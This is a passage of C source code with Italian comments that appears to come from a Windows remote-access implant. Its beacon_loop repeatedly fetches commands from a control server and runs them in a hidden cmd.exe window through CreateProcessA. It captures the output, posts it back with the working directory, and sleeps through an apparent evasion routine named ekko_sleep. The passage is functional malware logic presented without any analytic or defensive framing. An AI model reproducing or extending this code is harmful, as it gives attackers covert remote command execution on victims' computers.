        snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c \"%s\"", bat_path);
    } else {
        /* Fallback senza CWD tracking */
        snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd);
    }

    /* ── Avvia processo con pipe stdout/stderr ────────────────────────────── */
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        if (bat_ok) DeleteFileA(bat_path);
        return NULL;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb      = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL,
                        g_cwd[0] ? g_cwd : NULL,   /* CWD ereditato dal processo figlio */
                        &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        if (bat_ok) DeleteFileA(bat_path);
        return NULL;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, 15000);

    /* ── Leggi output ────────────────────────────────────────────────────── */
    char  chunk[4096];
    char *raw_out = (char*)malloc(1);
    raw_out[0]    = '\0';
    DWORD total   = 0, nread = 0;
    while (ReadFile(hRead, chunk, sizeof(chunk)-1, &nread, NULL) && nread > 0) {
        char *nb = (char*)realloc(raw_out, total + nread + 1);
        if (!nb) break;
        raw_out = nb;
        memcpy(raw_out + total, chunk, nread);
        total += nread;
        raw_out[total] = '\0';
    }
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (bat_ok) DeleteFileA(bat_path);

    char *utf8_out = to_utf8(raw_out, total);
    free(raw_out);

    /* Aggiorna g_cwd ed elimina il marcatore dall'output */
    if (bat_ok) utf8_out = _exec_cwd_strip(utf8_out);

    return utf8_out;
}

/* ── parse_cmd — gestisce correttamente i caratteri escaped nel JSON ──────────
 *
 * Il vecchio parse usava strchr(pos, '"') che si fermava al primo "
 * anche se preceduto da \, spezzando comandi con virgolette (echo "hello").
 * Ora scansiona carattere per carattere decodificando le sequenze escape.  */
static char* parse_cmd(const char* json) {
    const char* key = "\"cmd\":\"";
    const char* pos = strstr(json, key);
    if (!pos) return NULL;
    pos += strlen(key);

    size_t cap = 256, len = 0;
    char* cmd = (char*)malloc(cap);
    if (!cmd) return NULL;

    while (*pos && *pos != '"') {
        /* Espandi il buffer se necessario */
        if (len + 8 >= cap) {
            cap *= 2;
            char* tmp = (char*)realloc(cmd, cap);
            if (!tmp) { free(cmd); return NULL; }
            cmd = tmp;
        }
        if (*pos == '\\' && *(pos + 1)) {
            pos++;
            switch (*pos) {
                case '"':  cmd[len++] = '"';  break;
                case '\\': cmd[len++] = '\\'; break;
                case 'n':  cmd[len++] = '\n'; break;
                case 'r':  cmd[len++] = '\r'; break;
                case 't':  cmd[len++] = '\t'; break;
                case 'u':  /* \uXXXX — prendi solo il byte basso per ASCII */
                    if (pos[1] && pos[2] && pos[3] && pos[4]) {
                        unsigned int cp = 0;
                        sscanf(pos + 1, "%4x", &cp);
                        cmd[len++] = (char)(cp & 0xFF);
                        pos += 4;
                    }
                    break;
                default:   cmd[len++] = *pos; break;
            }
        } else {
            cmd[len++] = *pos;
        }
        pos++;
    }
    cmd[len] = '\0';
    return cmd;
}

/* ── Beacon loop ─────────────────────────────────────────────────────────────*/
void beacon_loop(void) {
    _init_cwd();   /* inizializza g_cwd al primo avvio */
    while (1) {
        char* response = beacon_get();
        if (response) {
            char* cmd = parse_cmd(response);
            if (cmd && cmd[0] != '\0') {
                char* output = execute_command(cmd);
                result_post(cmd, output ? output : "", g_cwd);
                if (output) free(output);
                free(cmd);
            } else if (cmd) {
                free(cmd);
            }
            free(response);
        }
        ekko_sleep(calc_sleep());
    }
}
